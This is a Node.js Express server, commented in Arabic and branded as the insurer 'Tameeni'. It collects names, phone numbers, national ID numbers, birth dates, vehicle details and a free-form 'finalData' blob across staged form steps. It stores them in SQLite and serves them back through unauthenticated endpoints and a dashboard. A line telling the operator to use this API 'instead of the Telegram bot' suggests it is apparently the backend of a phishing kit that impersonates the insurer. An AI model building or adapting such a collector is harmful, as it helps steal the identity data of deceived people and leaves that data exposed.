const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const sqlite3 = require('sqlite3').verbose();
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(helmet());
app.use(cors());
app.use(morgan('combined'));
app.use(express.json());
app.use(express.static('public'));

// إعداد قاعدة البيانات
const db = new sqlite3.Database('./tameeni_data.db', (err) => {
  if (err) {
    console.error('خطأ في الاتصال بقاعدة البيانات:', err);
  } else {
    console.log('تم الاتصال بقاعدة البيانات بنجاح');
    initializeDatabase();
  }
});

// إنشاء جداول قاعدة البيانات
function initializeDatabase() {
  db.run(`
    CREATE TABLE IF NOT EXISTS submissions (
      id TEXT PRIMARY KEY,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
      step INTEGER,
      userName TEXT,
      phoneNumber TEXT,
      idNumber TEXT,
      offerType TEXT,
      regType TEXT,
      birthDate TEXT,
      serialNumber TEXT,
      carYear TEXT,
      carMake TEXT,
      usageType TEXT,
      city TEXT,
      startDate TEXT,
      insuranceType TEXT,
      insuranceClass TEXT,
      additionalCoverage TEXT,
      coverageAmount TEXT,
      finalData TEXT,
      status TEXT DEFAULT 'جديد'
    )
  `);
}

// API Endpoints

// استقبال بيانات خطوة 1
app.post('/api/step1', (req, res) => {
  try {
    const data = req.body;
    const id = uuidv4();
    
    const stmt = db.prepare(`
      INSERT INTO submissions (id, step, userName, phoneNumber, idNumber, offerType, regType, birthDate, serialNumber, carYear)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);
    
    stmt.run([
      id,
      1,
      data.userName,
      data.phoneNumber,
      data.idNumber,
      data.offerType,
      data.regType,
      data.birthDate,
      data.serialNumber,
      data.carYear
    ], function(err) {
      if (err) {
        console.error('خطأ في حفظ البيانات:', err);
        res.status(500).json({ error: 'خطأ في حفظ البيانات' });
      } else {
        res.json({ success: true, id: id });
      }
    });
    
  } catch (error) {
    console.error('خطأ في معالجة البيانات:', error);
    res.status(500).json({ error: 'خطأ في الخادم' });
  }
});

// استقبال بيانات خطوة 2
app.post('/api/step2', (req, res) => {
  try {
    const data = req.body;
    
    const stmt = db.prepare(`
      UPDATE submissions SET 
        carMake = ?, usageType = ?, city = ?, startDate = ?, step = 2
      WHERE idNumber = ? AND step = 1
    `);
    
    stmt.run([
      data.carMake,
      data.usageType,
      data.city,
      data.startDate,
      data.idNumber
    ], function(err) {
      if (err) {
        console.error('خطأ في تحديث البيانات:', err);
        res.status(500).json({ error: 'خطأ في حفظ البيانات' });
      } else {
        res.json({ success: true });
      }
    });
    
  } catch (error) {
    console.error('خطأ في معالجة البيانات:', error);
    res.status(500).json({ error: 'خطأ في الخادم' });
  }
});

// استقبال البيانات النهائية
app.post('/api/final', (req, res) => {
  try {
    const data = req.body;
    
    const stmt = db.prepare(`
      UPDATE submissions SET 
        coverageAmount = ?, finalData = ?, step = 5, status = 'مكتمل'
      WHERE idNumber = ? AND step = 2
    `);
    
    stmt.run([
      data.coverageAmount,
      JSON.stringify(data),
      data.idNumber
    ], function(err) {
      if (err) {
        console.error('خطأ في حفظ البيانات النهائية:', err);
        res.status(500).json({ error: 'خطأ في حفظ البيانات' });
      } else {
        res.json({ success: true });
      }
    });
    
  } catch (error) {
    console.error('خطأ في معالجة البيانات النهائية:', error);
    res.status(500).json({ error: 'خطأ في الخادم' });
  }
});

// جلب جميع البيانات
app.get('/api/submissions', (req, res) => {
  db.all(`
    SELECT * FROM submissions 
    ORDER BY timestamp DESC 
    LIMIT 100
  `, (err, rows) => {
    if (err) {
      console.error('خطأ في جلب البيانات:', err);
      res.status(500).json({ error: 'خطأ في جلب البيانات' });
    } else {
      res.json(rows);
    }
  });
});

// جلب البيانات بحسب الحالة
app.get('/api/submissions/status/:status', (req, res) => {
  const status = req.params.status;
  db.all(`
    SELECT * FROM submissions 
    WHERE status = ? 
    ORDER BY timestamp DESC
  `, [status], (err, rows) => {
    if (err) {
      console.error('خطأ في جلب البيانات:', err);
      res.status(500).json({ error: 'خطأ في جلب البيانات' });
    } else {
      res.json(rows);
    }
  });
});

// إحصائيات سريعة
app.get('/api/stats', (req, res) => {
  const queries = [
    new Promise((resolve, reject) => {
      db.get('SELECT COUNT(*) as total FROM submissions', (err, row) => {
        if (err) reject(err);
        else resolve(row.total);
      });
    }),
    new Promise((resolve, reject) => {
      db.get('SELECT COUNT(*) as completed FROM submissions WHERE status = "مكتمل"', (err, row) => {
        if (err) reject(err);
        else resolve(row.completed);
      });
    }),
    new Promise((resolve, reject) => {
      db.get('SELECT COUNT(*) as today FROM submissions WHERE DATE(timestamp) = DATE("now")', (err, row) => {
        if (err) reject(err);
        else resolve(row.today);
      });
    })
  ];

  Promise.all(queries).then(([total, completed, today]) => {
    res.json({
      total,
      completed,
      today,
      completion_rate: total > 0 ? Math.round((completed / total) * 100) : 0
    });
  }).catch(err => {
    console.error('خطأ في جلب الإحصائيات:', err);
    res.status(500).json({ error: 'خطأ في جلب الإحصائيات' });
  });
});

// صفحة البداية
app.get('/', (req, res) => {
  res.redirect('/dashboard.html');
});

// API Status page
app.get('/api-status', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html dir="rtl" lang="ar">
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>تأميني - API Dashboard</title>
      <style>
        body {
          font-family: 'Cairo', Arial, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white;
          text-align: center;
          padding: 50px;
          margin: 0;
        }
        .container {
          max-width: 600px;
          margin: 0 auto;
          background: rgba(255,255,255,0.1);
          padding: 40px;
          border-radius: 20px;
          backdrop-filter: blur(10px);
        }
        h1 { font-size: 2.5em; margin-bottom: 20px; }
        .status { 
          font-size: 1.2em; 
          padding: 15px; 
          background: rgba(76, 175, 80, 0.3); 
          border-radius: 10px; 
          margin: 20px 0; 
        }
        .api-info {
          text-align: right;
          background: rgba(0,0,0,0.2);
          padding: 20px;
          border-radius: 10px;
          margin: 20px 0;
        }
        .api-endpoint {
          font-family: monospace;
          background: rgba(0,0,0,0.3);
          padding: 5px 10px;
          border-radius: 5px;
          display: inline-block;
          margin: 5px 0;
        }
        .links {
          margin-top: 20px;
        }
        .links a {
          color: white;
          text-decoration: none;
          background: rgba(255,255,255,0.2);
          padding: 10px 20px;
          border-radius: 10px;
          margin: 0 10px;
          display: inline-block;
        }
        .links a:hover {
          background: rgba(255,255,255,0.3);
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>🚀 تأميني - Dashboard API</h1>
        <div class="status">
          ✅ الخادم يعمل بنجاح!
        </div>
        <div class="api-info">
          <h3>📡 API Endpoints المتاحة:</h3>
          <div class="api-endpoint">POST /api/step1 - بيانات الخطوة الأولى</div>
          <div class="api-endpoint">POST /api/step2 - بيانات الخطوة الثانية</div>
          <div class="api-endpoint">POST /api/final - البيانات النهائية</div>
          <div class="api-endpoint">GET /api/submissions - عرض جميع البيانات</div>
          <div class="api-endpoint">GET /api/stats - الإحصائيات السريعة</div>
        </div>
        <div class="links">
          <a href="/dashboard.html">📊 فتح لوحة التحكم</a>
          <a href="/api-status">ℹ️ معلومات API</a>
        </div>
        <p>يمكنك الآن ربط موقعك بـ API هذا بدلاً من بوت تيليجرام</p>
      </div>
    </body>
    </html>
  `);
});

// بدء الخادم
app.listen(PORT, () => {
  console.log(`🚀 الخادم يعمل على المنفذ ${PORT}`);
  console.log(`📊 Dashboard API جاهز للاستخدام`);
});

// معالجة إغلاق التطبيق
process.on('SIGINT', () => {
  console.log('\n⏹️  جاري إغلاق الخادم...');
  db.close((err) => {
    if (err) {
      console.error('خطأ في إغلاق قاعدة البيانات:', err);
    } else {
      console.log('✅ تم إغلاق قاعدة البيانات بنجاح');
    }
    process.exit(0);
  });
});